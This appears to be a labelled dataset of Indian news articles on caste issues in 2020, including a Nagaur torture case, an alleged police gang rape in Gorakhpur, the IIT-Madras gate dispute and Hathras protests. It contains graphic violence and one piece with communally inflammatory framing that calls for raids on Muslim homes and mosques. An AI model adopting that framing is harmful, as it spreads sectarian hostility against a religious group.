SCs and STs before providing reservation for the posts that are filled through promotions in government jobs”. In the same month, the state government and a body of general and Other Backward Classes (OBC) employees filed a special leave petition in the Supreme Court. Speaking to PTI, Union Minister Ram Vilas Paswan asked to ""rectify"" the Supreme Court verdict, an ordinance should be brought and the Constitution should be amended and all such issues should be included in the Ninth Schedule of the Constitution to insulate them from judicial review so that they aren’t delayed due to legal wrangles. He said, “The Supreme Court saying that it is up to the state government for giving reservation in jobs and it is not a fundamental right...This is all part of the Constitution, and the people have this objection that the verdict is against the interests of the SCs and STs.” He also said that around 70 Dalit and tribal MPs, including Union Ministers had gathered for a meeting earlier in the week and decided to put forth two main demands to the government - an ordinance be passed and then Constitutional amendment made to nullify the Supreme Court verdict on reservation in jobs and also have an Indian Judicial Service to ensure representation of SCs, STs and OBCs in the higher judiciary.

1,"While the police have detained seven persons in connection with the incident, the showroom staffers have also lodged a case against the two Dalits for stealing money. Published: 20th February 2020 09:07 AM | Last Updated: 21st February 2020 08:49 AM | A+A A- The video shows an oiled screwdriver being inserted in the Dalit man who was caught stealing in Rajasthan. (Photo| Twitter screengrab) JAIPUR: In a horrific incident in Rajasthan’s Nagaur district, a Dalit youth was brutally beaten with belt and wires before being stripped ad petrol poured into his rectum with the help of screwdrivers by seven assaulters, last Sunday. The gruesome act, however, forced police to rush and file a case but only after a video made by the assaulters went viral on Wednesday. Seven people have been arrested in the case on the complaint of the Dalit youth in the presence of Deputy Superintendent of Police of Nagaur. Police identified the young victim as a resident of Karanu village under Panchauri police station area in the district. Those booked in the case are Bhim Singh, Aidan Singh, Asu Singh, Sawai Singh, Laxman Singh, Hanuman Singh and Ganpatram. As per the complaint, the accused thrashed the youth and pushed a cloth soaked in petrol into his rectum with the help of a screwdriver, severely injuring him. The victim’s cousin, who was with him, was also beaten up. When the victim’s condition deteriorated, neighbours intervened and rushed him to a nearby hospital. The victim said in the complaint that on February 16, he went to Karanu village to get his bike serviced along with his cousin where the accused charged him with stealing at the counter. When he denied it, they started assaulting him. Nagaur Superintendent of Police Vikas Pathak said he immediately formed several police teams to identify the assaulters through the video and they were arrested. The incident, however, has blown into a political storm, with three MLAs of RLP boycotting Chief Minister Ashok Gehlot’s Budget Speech in the Rajasthan Assembly on Wednesday even as the BJP joined the protest. Amit Malviya, national in-charge of the BJP IT cell tweeted: “State government? The Chief Minister is also the Home Minister and his name is Ashok Gehlot. Just in case you didn’t know who is responsible for the brutality against Dalits in the state. Ever since Congress formed govt in Rajasthan, crime against Dalits and women has shot up.” An anguished former Congress president Rahul Gandhi expressed his despair. “The recent video of two young Dalit men being brutally tortured in Nagaur, Rajasthan is horrific & sickening. I urge the state Government to take immediate action to bring the perpetrators of this shocking crime to justice,” he tweeted CM gehlot promises tough action Rajasthan Chief Minister Ashok Gehlot has assured of tough action against the culprits. He tweeted: “In the horrific incident in Nagaur, immediate and effective action has been taken and seven accused have been arrested so far. Nobody will be spared. The culprits will be punished according to the law and we will ensure that the victims get justice.” O P E N Disclaimer : We respect your thoughts and views!

Under the banner of the Bharat Bachao Dalit Manch, a protest march, scheduled from the Desh Bhagat Yadgar Hall to the RSS office here, was held. The march was held till Jail Chowk from where it was not allowed to move forward. Despite being stopped by the police, activists were successful in marching for 2 km up to Jail Chowk. While the activists raised slogans at the chowk for around three hours holding up traffic, they relented after announcement that Malwa zone and Majha zone-level rallies against the CAA would be held during which they would gherao the RSS office. A declaration was also made that the NPR, being started in the state from May 15, will be opposed sternly and they would extend whole-hearted support to the Bharat Bandh on February 23. The activists said the NRC, CAA and NPR was being implemented across the country by the Narendra Modi-led Central Government. The organisations said the Sangh Parivar wanted to turn the country into a ‘Hindu rashtra’. For which minorities, Dalits and tribals were being targeted. They also said efforts were on to make changes to the Constitution. In the beginning of the rally, tributes were paid to Comrade Gurmeet Singh Dhadda and silence observed in his memory. The manch called for all Dalit organisations, who have remained out of the common front against the CAA as yet, to join in. State leaders of the Bharat Bachao Dalit Manch Tarsem Peter, Sukhwinder Kotli, Nachattar Nath, Shergill, Anil Bagha, Joginder Singh, Chirnaji Lal Kangniwal, Ayub Khan, Ramesh Chouhkan, Kashmir Singh Ghugshore, Tarsem Thapar and Jassi Tallan were among those others present.

1,"UP BJP MLA's son accused of assaulting Dalit employee  Uttar Pradesh BJP MLA Surendra Singh's son Hazari Singh has been accused of beating a Dalit employee. The incident took place on Wednesday and hundreds of tehsil office employees staged a demonstration at the police station demanding Hazari Singh's arrest. According to reports, Hazari Singh beat up the employee, Radhey Shyam, following a dispute over the choice of a particular booth level officer in Jamdharwa village.

They slapped and kicked me when I fell down on the ground,"" Radhey Shyam said. Hazari Singh, however, completely denied the incident and said that the concerned employee had misbehaved with them and had pushed one of his supporters.

1,"A 20-year-old Dalit woman was allegedly abducted and gang raped and assaulted by two policemen in a hotel room in UP’s Gorakhpur on Thursday night. The police dismissed the charges, saying both the CCTV footage of hotel and the statement by hotel’s guard makes it clear that the woman had gone to the hotel on her own, triggering public outrage with many slamming “protectors turning predators” in the chief minister’s own city. Following the public outrage over the incident and the pressure to act against culprits, an FIR into the incident was lodged at the Cantonment police station late on Friday night. Leaders of political parties including Congress’s district president Nirmala Paswan, BSP workers led by district president Ghanshyam Rahi and BJP MLC Devendra Pratap Singh met the victim at the district hospital, where she was admitted after the incident. SSP Sunil Gupta said, “Yesterday, on February 14, a woman came to the district hospital and alleged that two policemen took her away on a bike and raped her in a hotel. The police acted swiftly on the complaint after which name of a hotel surfaced. During detailed investigation, the charges were found to be untrue. It came to the fore, on the basis of CCTV footage and the statement of hotel’s guard that the woman had gone to the hotel on her own. So, prima facie, the matter seems to be suspicious. However an FIR has been lodged for further action.” According to reports, the incident occurred on Thursday night when the woman was returning home with her mother and elder sister on Thursday night at around 9pm on foot. According to the woman, as she walked ahead of her mother, two bike-borne policemen came and forced her to sit on their bike. When she resisted they threatened to frame her in a sex racket and assured that they will let her go after questioning at the police station. Instead of the police station, the duo took her to a hotel room, forced her to consume alcohol and then raped her taking turns. They also beat her up and gave her Rs 600 while threatening her not to open her mouth. On returning home late at night, she narrated her ordeal to her mother. On Saturday, Congress workers led by Nirmala Paswan staged a sit-in at the DM’s office. “The Congress party demands a SIT enquiry into the incident, security for family members of the victim and immediate arrest of the accused policemen.” Get our daily newsletter Get free access to newsletters, alerts and recommendations"

A case had been registered against her for offences under the Indian Penal Code, including creating enmity between different groups of people against the woman, identified as Arudra, they said. Representational image. PTI ""We have registered the case suo moto (on their own) for creating enmity between different groups of people,"" Deputy Commissioner of Police Chetan Singh Rathore said. The woman was produced before a city court judge, who remanded her to 14 days judicial custody till 5 March. Holding the placard with the slogans, Arudra was spotted sitting among the participants of the protest, organised by the Hindu Jagaran Vedike against Amulya Leona, who had shouted ""Pakistan Zindabad"" on Thursday. She was escorted out of the place as protesters asked her to leave and the crowd started gathering, city police chief Bhaskar Rao had said. ""She was taken into custody for her own safety along with the placard... we will find out her background, where she has come from and who are behind her among other things,"" Rao had earlier told reporters, adding she did not raise any slogan. The ""Kashmir Mukti, Dalit Mukti, Muslim Mukti"" slogans were written in both Kannada and English in the placard held by her. The Hindu Jagaran Vedike organised the protest against Amulya Leona who had raised ""Pakistan Zindabad"" slogan thrice at an even against the Citizenship Amendment Act.

Superintendent of Police of Nagaur district, Vikas Pathak told the accused have been charged under sections of SC/ST Act as well as for bodily offenses among others. On Thursday, three RLP MLAs entered the state Assembly holding placards demanding a stop to atrocities on Dalits. As the day was a budget day, the Speaker had to intervene and the three protesting MLAs staged a walkout followed by a dharna at the entrance of the Assembly. As per the reports, the police officials confirmed that the video of the incident — which happened in Karnu village of Nagaur’s Panchaudi area — went viral on the same day (February 16). SP Vikas Pathak told the reason behind the torture was that they allegedly tried to steal money from the cashbox at a motorcycle showroom. <!-- e9 = new Object(); e9.size = ""300x250,300x600,160x600""; //--> (adsbygoogle = window.adsbygoogle || []).push({}); "
1,"Representative image Bengaluru: A day after pro-Pakistan slogans were raised by an agitator at an anti-CAA event here, a young woman was 'detained' on Friday for holding a ""Kashmir Mukti (liberation), Dalit Mukti, Muslim Mukti"" placard at a counter-protest in the city, police said. Holding the placard with the slogans, she was spotted sitting among the participants of the protest organised by the Hindu Jagaran Vedike against the woman who had shouted ""Pakistan Zindabad"" on Thursday. City police chief Bhaskar Rao said she was escorted out of the place as the Vedike members asked her to leave and crowd started gathering. ""She has been now been taken into custody for her own safety along with the placard... we will find out her background, where she has come from and who are behind her among other things,"" Rao told reporters, adding she did not raise any slogan. The ""Kashmir Mukti (liberation), Dalit Mukti, Muslim Mukti"" slogans were written in both Kannada and English in the placard held by her. To a question if she would be arrested, the Commissioner said let the investigation be held. ""It is too early as she has just been taken into custody,"" he added. Last evening, Amulya Leona had raised ""Pakistan Zindabad"" slogan thrice in the presence of All India Majlis-e-Ittehadul Muslimeen (AIMIM) chief Asaduddin Owaisi after the organisers of the event under the banner of ""Save Constitution"" invited her to address the gathering, prompting him to denounce her act.

1,"CHENNAI, Tamil Nadu — On Christmas last year, the administration of the Indian Institute of Technology Madras, or IIT-M, boarded up a narrow gate to the institute’s sprawling 630-acre campus triggering a protest that has revived persistent conversation about caste, privilege, and the debt that India’s premier public-funded engineering institutions owe to their neighbouring communities. Krishna Gate, as the entrance that serves as a conduit between IIT-M and Velachery is called, was closed by the IIT-M administration on December 25 2019. In a subsequent email, IIT-M director Bhaskar Ramamurthy claimed the gate was shut due to a “heightened security threat” from “undesirable elements” who hangout near the gate, and to prevent the sale of “banned substances” and “assault on women” students. The residents of Velachery, many of whom are Adi Dravidar Dalits, see the closure of the gate as the betrayal of a 60-year-old agreement between IIT-M and their ancestors whose lands were acquired for the institute’s campus, and a clear instance of caste-based discrimination. Protests against the closure of the gate have acquired such momentum that the matter was recently raised on the floor of Tamil Nadu’s Legislative Assembly. Residents say the Adi Dravidar community lost at least 76 acres of land in the deal that was struck after deliberations between the sarpanchs of Velachery, Taramani, and Kanagam on the one hand, and K Kamaraj, the then Chief Minister of Tamil Nadu, Dr. A Lakshmanaswamy, the first chairman of the IIT board of governors, and Dr. B Sengupto the first director of IIT-Madras. In return for their lands, residents were promised access to the campus through Krishna gate, employment on campus and the right to worship at their temple, Peeliamman Kovil which also fell on IIT lands after the acquisition. Over the next decades, children born in the area were also promised preferential enrollment in schools located inside the campus, residents said, adding that close to 500 students from the locality now study at the Vanavani and Kendriya Vidyalaya schools on campus. The sudden and arbitrary closure of the gate has broken this decades-long pact, prompting the question of how institutions like the IITs see their place in Indian society: As open campuses fostering a culture of engagement; or as elite, isolated enclaves where nerdy students prep feverishly for high-paying corporate jobs, while justifying their publicly subsidised education under the guise of nation-building. “Who are they to stop us?” asked Manimaran, a resident of Velachary at a public meeting held on January 19 under a tamarind tree close to the now-shuttered Krishna Gate. “Under this tamarind tree generations of our people have been gathering to settle issues of the community,” Manimaran continued. “This land belongs to us and we gave them some of it for development. We will reclaim the gate and our right to enter IIT no matter what.” Residents said the administration only seems to have perceived a threat to student safety from Krishna Gate — which opens out into a predominantly Dalit settlement. Taramani Gate, which opens out into a Brahmin and Other Backward Classes neighbourhood, had been kept open. “Scheduled Caste people live in this area. By issuing the explanation about “undesirable elements”, the IIT director has wounded us. This is an insult,” said K. Rajendran, a retired IIT-Madras employee who got a job because his mother gave up her land for the institute. Assistant Commissioner of Police PK Ravi confirmed that the police had recently arrested a few men selling marijuana near Krishna gate, but added the problem wasn’t restricted to a particular community or neighbourhood. “We had arrested some anti-social elements who were peddling banned substances near the Krishna gate six months ago,” Ravi said. “The problem persists even near Taramani gate of the institute”. Thol Thirumavalavan, the Member of Parliament for Chidambaram constituency too had made his concerns explicit in a letter to the IIT administration. “While all gates including those designated for other communities are open and accessible, the IIT management has shut the gate for Adi Dravidar people with the ill intention of untouchability,” Thirumavalavan said. “This act has not only destroyed the livelihood of AD people but it is also unlawful caste discrimination”. V. Prabhu was six years old when his family’s lands were acquired by IIT-Madras in 1959. “We used to live where the women’s hostels now stand,” said Prabhu, who is now 60. The family had 11 cows and used to supply milk to nearby households, and also ran a cycle stand with 21 bicycles that they rented out to residents. When their land was acquired, Prabhu said, the family faced hard times. Initially, there was little demand for milk as the land had been cleared, and only a few IIT officers, staff and students were on campus; the cycle business shut down as well. The family eagerly awaited the promised jobs on campus. But few, if any promises of jobs, employment and development were coded into the land acquisition contracts signed with the villagers in 1959. The only land acquisition document that villagers could share with HuffPost India, lists 27 names of owners most of whom had sold the land where their “huts” once stood. They were paid government land rates ranging between Rs. 6 to Rs. 65. The document signed on 2 December 1964 by a Revenue Division Officer, also notes that the government had paid a total of Rs. 672.50 to 27 families at the time. In 1972, Prabhu was offered a temporary job in the electricity and maintenance wing but he soon quit because the pay was too low. “I took up business and started earning better,” he said. His children, now in their 20s, had studied in IIT-M’s Vanavani school in their teens by availing the preferential admission process which has since been phased out. As Prabhu’s business picked up, he moved out of Velachery. So why was he still part of the Krishna gate protests? “When my father was alive, he used to go for walks into the IIT campus. He used to fight security personnel if they stopped him because he was convinced that he still had claim over the land which the government took,” Prabhu said. “Our sweat and blood is part of this land. The closure has hurt the pride of all our people.” In this context, the closure of the Krishna gate appears to have triggered deep social memories of exclusion. Since the gate was shut in December 2019, the only way to reach Velachary from campus is via a 3 km detour. As a consequence, several small shops and businesses set up to cater to IIT’s student population have suffered: Photocopy centres, eateries, bike repair shops and even the local housing market. S. Kumareshan, a mechanic, said he has been out of work for three weeks. “The owner of the bike repair shop is thinking of taking his business elsewhere if the gate remains shut,” Kumareshan said. Students who have rented apartments in the vicinity too may move out soon, landowners said, expressing fear over a drop in rent rates and real estate prices. Retired IIT employees who have been using banking and medical services on campus are hit by the gate closure because they are now forced to travel much further to avail the facilities, residents said. “I am a heart patient,” said Rajendran, the former IIT employee. “If I suffer cardiac arrest or any other ailment I will now be forced to go to a private hospital located about six kilometres away instead of availing the pensioner’s medical health benefits at the IIT hospital”. ““IITs were conceived with a vision to mould engineers and researchers who could contribute to the process of nation building... The move to isolate us from the population outside is in direct conflict with this goal”.” Women students for Krishna gate The decision to close Krishna gate, IIT’s administration has claimed, was partly out of concerns for the safety of women students. Yet the institute’s women students appear unconvinced. 1,500 students — many of them women — have submitted a petition to the IIT administration demanding that the gate be reopened. “The director is misleading the public,” said K. Fabitha, a research associate at IIT-Madras who has participated in the protests. “I have been using the gate to go back home late at night. I have never come across the presence of any unsafe elements there.” While the IIT administration had claimed that a woman student was assaulted near Krishna gate, Fabitha said the assault had actually occurred elsewhere. The Krishna gate, she said, served as a vital conduit between the institute and the Velachery neighbourhood. “There is an emotional connection with the people and the place near Krishna gate,” Fabitha said. “They have always been a good memory attached to life in the institute. We could never differentiate between ‘us’ and ‘them’”. “IITs were conceived with a vision to mould engineers and researchers who could contribute to the process of nation-building,” said a member of ChintaBAR, an independent student body in IIT Madras, seeking anonymity as they feared they might be targeted by the administration. “The move to isolate us from the population outside is in direct conflict with this goal”. HuffPost India has reached out to the institute’s administration. This article will be updated when they respond. ."
1,"Dinesh Kumar Khatik is survived by his wife and two children. The elder son is seven years old while the younger is one and a half years old. Dinesh Kumar Khatik was one of the individuals killed in anti-Hindu riots in Delhi. OpIndia had a conversation with Dinesh Kumar Khatik’s brother Suresh and he clearly said that his brother’s life has been taken by jihad – the jihad of Islamic fundamentalists. He said that the whole of Mustafabad killed his brother. By Mustafabad, he meant a Muslim dominated area. This is how the gruesome murder unfolded. Dinesh Kumar Khatik is survived by his wife and two children. The elder son is seven years old while the younger is one and a half years old. He had gone to get milk for his two children on the 26th of February and due to the closure of shops, he had to go farther. During this, he passed by the school of Faisal Farooq. While he was passing by, the riotous Muslim mob was rampaging through the streets with petrol bombs along with firing and stone-pelting. Just then, a bullet from the rioters hit Dinesh’s head and he passed away. Advocate Monica Arora has also approached Prime Minister Narendra Modi to provide compensation and justice to the victim’s family. When OpIndia team reached the house of the deceased Dinesh, the atmosphere there was very turbid. There were some people who were taking note of the statements of the victims. They were referring to themselves as a committee of the court. Talking to them, Suresh said that his only demand from the government is that every madarsa and mosque should be searched so that the Muslim mobs cannot store dangerous weapons from now on. Suresh also reiterated this during a conversation with OpIndia. Others present there told OpIndia that bullets had been shot in the head, eyes and neck of the victimized Hindus. They told that weapons made of iron were stored and kept, with which the heads of Hindus were being attacked. People are still scared. The people of Prem Nagar and Prem Vihar, while narrating their grief to us, told us that their trust has been lost from the police administration. Hence, they are forced to stay awake every night and protect their lives. Especially for the safety of women at home they have to do this. Suresh made a very big charge while talking to us. He said that if the sticks and knives are found in the house of the Hindus, then the police throws them in jail, while weapons are kept in the house of the Muslims and absolutely nothing is done about it. “मेरे भाई को मुसलमानों ने मारा है। बड़ी-बड़ी इमारतों पर 300-300 की संख्या में मुस्लिम चढ़े हुए थे और गोलीबारी कर रहे थे।” -दलित समुदाय से आने वाले दिनेश खटीक को दंगाइयों ने मार डाला। उनके दो छोटे-छोटे बच्चे हैं। उनके भाई सुरेश ने @OpIndia_in से बातचीत की। हिंदुओं की बलि कब तक? https://t.co/KPfwhFfN0d pic.twitter.com/30ZUA7oNNm — Anupam K Singh ?? (@anupamnawada) March 1, 2020 On the day Dinesh Kumar Khatik was shot, Muslim rioters had created such a situation that he could not even be taken to the hospital. The old father is sitting in the balcony of his house with a lost soul. He has only one concern that how will Dinesh’s wife and children be maintained? As if he had swallowed the grief of the son’s death for his daughter-in-law and grandchildren. The brother of the deceased while talking to us further stated: “From 24 February itself, riots had started in the Shiv Vihar area of ​​Mustafabad. The Muslim people were constantly coming and looting Hindu shops. The houses of the Hindus were damaged and shops were burnt. Here all the shops were closed, so my brother went out to get food and milk for the children when he was killed. Attacks were being launched far and wide from the roof of the school. There are 2-4 more buildings of Muslims, in which hundreds of Muslims were gathered. 4 people have died. This is Jihad, nothing else. Inflammatory speeches are made by Radical Islamists. ” Suresh Khatik said that there is not even a stick in his house. Suresh said that he has told the police that action should be taken on Muslims as well if they get sticks or knives from the house of Hindus. They say that there should be raids in mosques and madrasas to prevent such incidents from happening. He asked, how do they have so much of weaponry? Raids should be conducted not only in madrasas and mosques but also in the homes of each Muslim, he said. Whether NDTV or 'The Wire', they never have to worry about funds.

1," In late 1980s, Bhanwar Meghwanshi, a 13-year-old from the Dalit community, started attending the Rashtriya Swayamsewak Sangh’s shakhas in Rajasthan, without knowing much about the organisation. Over the course of around four years, Meghwanshi grew to harbour a visceral hatred for Muslims and began to take immense pride in his Hindu identity. He dedicated himself to the cause of the RSS’s Hindu Rashtra, even receiving military training by the organisation. But after facing discrimination within the RSS, he realised that its vision is different for caste Hindus and Dalits. Meghwanshi is now a journalist and an activist. His book Main Ek Karsevak Tha—I Was a Karsevak—was first published in Hindi in 2019 and its English translation, I Could Not Be Hindu: The Story of a Dalit in the RSS, was published by Navayana in January this year. That month, Sushil Kumar, an independent journalist, spoke to Meghwanshi about the RSS’s process of indoctrinating its cadre, its glorification of violence and its vision for a Hindu Rashtra. Sushil Kumar: In which period were you in the RSS?Bhanwar Meghwanshi: I was active from 1987 to 1991. I participated in the first “karaseva” of 1990. I had left home to dismantle the Babri Masjid [in Uttar Pradesh’s Ayodhya], but did not reach, as the [Samajwadi Party chief] Mulayam Singh’s government was in power. At that time, we used to call him “Mulla-yam” Singh, meaning “maulana Mulayam.” His government arrested me, near the Tundla station, and kept me in the Agra jail for some ten days. By then, whatever karaseva had to take place had taken place. Then I returned home. SK: Were there any women at the shakha?BM: At the shakha, all were men. We talked only about purusharth, male dominance. It is evident that there was no place for women. Seen one way, the meaning of purushartha is masculinity, patriarchy. SK: What did you learn during your time as a swayamsevak?BM: I got to learn many things. First thing, I evidently became a reactionary. The second thing I learnt was to imagine everyone who was not from my village and panchayat as an enemy, and fight them, defeat them and hate them. Sushil Kumar is an independent journalist.

1,"Hyderabad: In State Of Telangana there is a remote village named Podduturu under Shankarpalli Mandal, Rangareddy District. On March 18, there was a very unusual scenario in this village. A person belonging to a higher caste(Reddy community) passed away. There was an unusual delay in the final death rituals. When enquired it came to know that the Dalits of the village rejected to be part of death rituals like doing all odd works for the dead and playing band in the death possession. No Dalit came forward in the entire village to take up the job. Finally, all the odd jobs even playing off the death band was done by the upper class (Reddy community). This strong rejection from Dalit community was in response to the higher community rejecting the installation of Babasaheb Ambedkar Statue in front of the panchayat office in the village. The Dalits of the village wanted to install the statue of Babasaheb in the open land in front of the panchayat office and they requested for the permission for the same. But the village sarpanch belonging to higher caste (reddy) opposed it. He said he will get permission to install statues of Shivaji Maharaj or Swami Vivekananda but he will not let them install a statue of Babasaheb. Retaliating to this the Dalits called for a Dalit community meeting on 18 March morning. Dalit community heads decided Dalits of the village will not work for any upper caste. The Dalits will lead a free and dignified life. Nobody can force them to work the way they used to for centuries. It was unanimously decided that Dalits will not play bands on deaths or on marriages of the higher community as per custom. Dalit leaders Mr.K. Ramu, Mr. K Katagiri, Mr. G Vijay, Mr. K lachayya, Mr. Malesham, Mr. Laxman and Mr. K Prasad said that this decision of the community will be strictly followed and if any Dalit found violating this unanimous decision of this community then he/she will be dealt very strictly and they will be thrown out of the community along with their family and near relations. A similar rejection of the upper community by Dalits took place in a remote village named Ramadugu Karimnagar. Here Dalit community also decided that they will not take up any odd job offered by upper caste. They will lead to dignified life breaking centuries-old customs. In this village, Dalits are not playing dead bands or marriage bands either. Get the news updates on WhatsApp & Telegram by subscribing to our channels.

1,"In republican India’s history, there is no politician who can match Kanshiram’s life story. No one else could have carved a niche for the Scheduled Castes, Scheduled Tribes, Other Backward Classes and the Minorities as much as he did. He came on the Indian political scene without a resumé popping with credentials of legacy, inheritance, wealth, title, surname or party. Irrespective of all these barriers, he sculpted a solid, unremitting, electrifying Bahujan movement in India. He hailed from an agriculturist Chamar family, but being a Sikh had no impact on caste exclusions of Dalits in the region. Kanshiram, born on March 15, 1934, was aware of this, yet not to the extent of grasping the nuances of such discrimination. He had naively thought of Brahmins as being a poor and backward community due to their low status in Jaat-dominant Punjab. Also read | Ambedkar and Kanshi Ram — so alike, yet so different In his later life, there was one incident in his diverse working stints that had an impact on him. In 1957, he settled for a job as a research assistant in the Ministry of Defence’s Explosives Research and Development Laboratory (also called the High Energy Materials Research Laboratory), in Pune. A colleague, a class IV employee, Dinabhana from Rajasthan’s Bhangi caste, had taken it upon himself to protest the administration’s cancellation of holidays for Ambedkar and Buddha Jayanti. As a consequence, he was fired for raising the issue. He chose to fight it in court. Looking at Dinabhana’s unrelenting struggle, Kanshiram turned towards activism to seek social justice and political freedoms. Much of Kanshiram’s memories are lived through anecdotes and his speeches. A.R. Akela, a foremost scholar of the Bahujan movement, has compiled a series and published them in Hindi. It must be noted that Kanshiram did not leave extensive written records or archives barring the classic, The Chamcha Age (An Era of the Stooge). Dedicated to Mahatma Jyotirao Phule, The Chamcha Age was later to be the founding ground of a party that would be a disrupter in India’s casteist political spectrum — the Bahujan Samaj Party. Kanshiram started by wanting to do nothing with the tokenised, genuflecting leadership of Dalit leaders that the Poona Pact between Gandhi and Dr. Ambedkar had produced. Such a leadership was willing to be the secondary elements of the dominant Congress party. Review of Kanshiram — Leader of the Dalits: A look back at the colourful history of a bahujan leader Following simmering resentment against the political attitude towards Dalits, Kanshiram gathered middle class government employees who were seeking leadership that had a spine and self-pride. He recruited disgruntled intellectuals and government employees to give wheels to the caravan of the Bahujan movement. In current times, Kanshiram’s struggle continues to be more popular and his ideas acceptable to second and third generation Dalits who are unwilling to settle for anything less than what they deserve. Educated and with a confident outlook, the young breed of Dalits are now aiming to give life to Ambedkar’s vision — of becoming a part of the ruling class of the country. Through Kanshiram they see a feasible, methodical approach to getting that throne. Almost every student organisation, social and political outfit subscribes to the legacy of Ambedkar. The Bhim Army Ekta Mission, for instance, wants to be seen as a part of Kanshiram’s Ambedkarite legacy. The Bhim Army’s status is complicated on a national scale. Though its flamboyant leader, Chandrashekhar Azad, has an appeal across caste, religion and regional lines, the organisation’s social base has still to be firmed up. Its apolitical work such as pre-school training, having an atrocity grievance cell and cultural activism needs to be expanded. There needs to be a multi-organisational strategy. Also read | The Bahujan movement needs to reinvent itself There are several Bahujan organisations that work towards Dr. Ambedkar’s dream of a non-caste India. But the origins of this can be traced back to the BAMCEF, or the All India Backward (SC, ST, and OBC) and Minority Communities Employees Federation. Along with his colleagues, Kanshiram began one of the largest unions of government employees. Through BAMCEF, he connected SC, ST, OBCs, and other minorities to fight back against atrocities and discrimination. With a structure in place, he was able to help create a strong sense of accountability towards the community. Thus, the widely popular initiative ‘Pay Back to Society’ was inaugurated in 1973. As a part of BAMCEF there were simultaneous initiatives such as the BAMCEF Datta Grahan, -Bhaichara, -Sahkarita. In 1981, the Dalit Shoshit Samaj Sangharsh Samiti (DS-4) with 10 wings (students, women, etc.) was established to experiment with socio-political possibilities. Eventually the Bahujan Samaj Party (BSP) was formally established in 1984. Kanshiram declared that he wanted the community to become givers rather than receivers. For that to happen it required training and preparation. Cadre camps and various events filled the gap. Instead of downplaying the importance of caste, Kanshiram opted to strengthen oppressed caste associations which was one way to weaken the structures that sustain caste. Every ‘upper’ caste had an investment in caste, which is why it transferred this into structures that catered to its needs. Kanshiram invested in the cultures of caste and cultural methods of anti-casteism. He understood well that artists and in turn their art were organic intellectuals who were a part of the grass-roots. He sought them out and trained them. It is no accident that the ‘Ambedkar Mela on Wheels’ was among the many first Dalit History Month projects that featured Ambedkar’s photographs, books, pamphlets and posters. Also read | Mayawati, rebel leaders fight for Kanshi Ram’s legacy Kanshiram understood that emotional appeal was a far more powerful way to use radical anger that would help tackle the oppressor. Thus, the artwork and paintings depicting atrocities on the communities played a pivotal role in his outreach initiatives. He had grasped early on that while emotions are essential, a strategy was also needed to direct people’s thoughts into producing material. His deft editorial skills also found expression. The popular The Oppressed Indian and the Bahujan Sanghatak were his organisation’s mouthpieces. There were others that dealt with land reform, nationalisation of industries and a labour welfare regime such as Aarthik Utthan (1980) and Economic Monthly (1981) in addition to the impressive Bahujan Times (1984). Kanshiram can be said to be the leader who introduced Periyar to villages in north, central, eastern and western India. Like Periyar, there were many unsung heroes who were given space on the canvas of the BSP. They include Nandanar, Iyothee Thass, Nangeli, Birsa Munda, Savitribai Phule and Jhalkaribai. In hindsight, we are yet to find similar investments by his protégés. There are certainly no intellectual research wings, as was the case earlier, which can provide guidance to the movement. There is no media that can converse with the public on a daily basis on Dalit issues; neither is there any trust-building mechanism. Finally, moving to the present state of the BSP, it appears that the party leadership lacks a committed young cadre that can be trained to take over the reins of the leadership. Kanshiram’s legacy remains alive and kicking in the words of the BSP’s chief Mayawati. But in the absence of any credible sourcing of talent, organisations such as the Bhim Army and many BAMCEF-BSP inspired regional parties could step in and fill the vacuum.

1,"Demonstrations and protests held in Delhi, Mumbai and other parts of India  Thousands of people flooded Delhi's streets on October 2 to show solidarity with the Hathras gang rape victim. Youth, women's groups, activists and ordinary citizens came together to decry the heinous crime and the insensitive manner in which the Uttar Pradesh government handled the incident. The past few weeks have been reminiscent of the pre-Covid-19 times when people protested the Citizenship Amendment Act (CAA) of the BJP-led government in 2019. This time, around 5,000 people gathered at the Jantar Mantar protest in Delhi that was originally planned to be held at India Gate. Despite the last-minute change in venue, people arrived at the spot to denounce the atrocity suffered by the 19-year-old Dalit girl in Hathras. A video by a member of the If We Do Not Rise interviewed various people at the protest to show the varying demands of the protesters. While some people demanded stringent punishment for the accused, other participants voiced the rising caste-based crimes in Uttar Pradesh.       Student federations, women’s organisations and political leaders such as Chandrashekhar Azad, Kanhaiya Kumar, Jignesh Mevani, Yogendra Yadav, D. Raja and others participated in the protest.  हाथरस के वहशीपन पर मोदी जी खामोश क्यों हैं? जिस UP से वे दूसरी बार सदन मे पहुँचे हैं उसी UP में हाथरस भी है क्या PM यह नहीं जानते? हमारी बहन को कचरे की तरह जलाया गया इस पर चुप्पी क्यों ? हम आज शाम पांच बजे इन तमाम सवालों के जवाब लेने इंडिया गेट आ रहे हैं। #BharatAtIndiaGate pic.twitter.com/COqKh0DyCM  Simultaneously, such demonstrations took place in and around various parts of Mumbai. 15-20 organisations including marginalised people assembled at the Ambedkar Garden in Chembur to demand justice for the victim’s family. The assembled crowd lit candles, gave speeches against the UP government and the Central government and sang songs on women empowerment. The speeches also voiced a concern about the increasing fascism, growing violence and saffronisation of the police and judicial system.  The protesters in a statement said they had gone out on the streets despite the threat of the pandemic to decry the rising crimes against women, Dalits and other marginalised sections of society. The statement appealed to people to unite against the 'upper-caste', patriarchal oppressive classes in society. They added that the next protest is scheduled for 4 PM on October 6 at Chaitanyabhoomi, Dadar.  Similarly, people in Mumbra, a suburban area of Mumbai that has been dubbed as a ‘Muslim ghetto’ by news reports, staged a protest to show their solidarity with the victim’s family.   Friday’s protests have been a part of a series of protests which started earlier this week around September 30 at Chaityabhoomi in Dadar. On Thursday, hundreds of people assembled at Carter Road in Bandra as well to condemn the Hathras case in Uttar Pradesh.  Candle light protest at #CarterRoad #Bandra in light of the #HathrasCase.

When another protester, Sarasvati NT, was asked about the ongoing protests in the country for the UP case she said, “This is the moment to come out and actually talk about caste crimes. People are finally answering questions such as 'Why does caste matter in such cases?' Yet, whenever the caste-aspect comes in, people are very reluctant to voice their support.” She argued that people must continue talking about caste-issues and express their support for Dalit activists who are also arrested under UAPA.

The Police issued a statement on the protest: “Members of many political parties and different NGOs in different groups reached Jantar Mantar to stage a protest demanding harsh punishment for accused persons in Hathras Gangrape Case,” and added that some protestors were from groups that “were demanding fair investigation in Sushant Singh Rajput death case.” The Delhi Police, as reported by news media, have stated that the protestors have violated orders under Section 144 CrPC, and other laws related to Covid-19 protocol, a case under section 188 of IPC, 3 Epidemic Act and 51(b) Disaster Management Act, and cases were subsequently registered at Parliament Street police station. The protests peaked on October 2, as the world observed the birth anniversary of Mahatma Gandhi as the International Day of Non-Violence.

